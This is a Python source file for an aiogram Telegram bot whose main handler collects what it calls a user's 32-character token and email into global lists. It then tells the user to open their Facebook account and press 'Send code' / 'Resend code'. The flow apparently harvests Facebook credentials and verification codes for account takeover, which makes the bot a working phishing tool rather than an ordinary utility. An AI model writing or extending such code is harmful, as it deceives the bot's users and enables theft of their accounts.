from aiogram import types
from aiogram.dispatcher import FSMContext

from keyboards.inline.menu import menu
from loader import dp

token = []
email = []


# Эхо хендлер, куда летят текстовые сообщения без указанного состояния
@dp.message_handler(state=None)
async def bot_echo(message: types.Message):
    text = message.text
    if "@" in text:
        email.append(text)
        await message.reply(f'Спасибо я получил твой email - {text}\n\n'
                            f'Теперь:\n\n'
                            f'Открой свой Facebook аккаунт и нажми кнопку - <b>Отправить код</> или <b>Resend code</>\n\n'
                            f'👇После этого жми кнопку внизу - ✅ Код отправлен', reply_markup=menu)
    if " " in text.strip():
        token.append(text)
        await message.reply(f'{message.from_user.first_name}, я тут только за тем чтобы поработать!\n'
                            f'Отправляй мне пожалуйста то что я говорю! Спасибо 😂')

    if len(text) == 32:
        token.append(text)
        await message.reply(f'Спасибо я получил твой токен - {text}\n\n'
                            f'Теперь отправь мне пожалуйста свой email')


# Эхо хендлер, куда летят ВСЕ сообщения с указанным состоянием
@dp.message_handler(state="*", content_types=types.ContentTypes.ANY)
async def bot_echo_all(message: types.Message, state: FSMContext):
    state = await state.get_state()
    await message.answer(f"Эхо в состоянии <code>{state}</code>.\n"
                         f"\nСодержание сообщения:\n"
                         f"<code>{message}</code>")
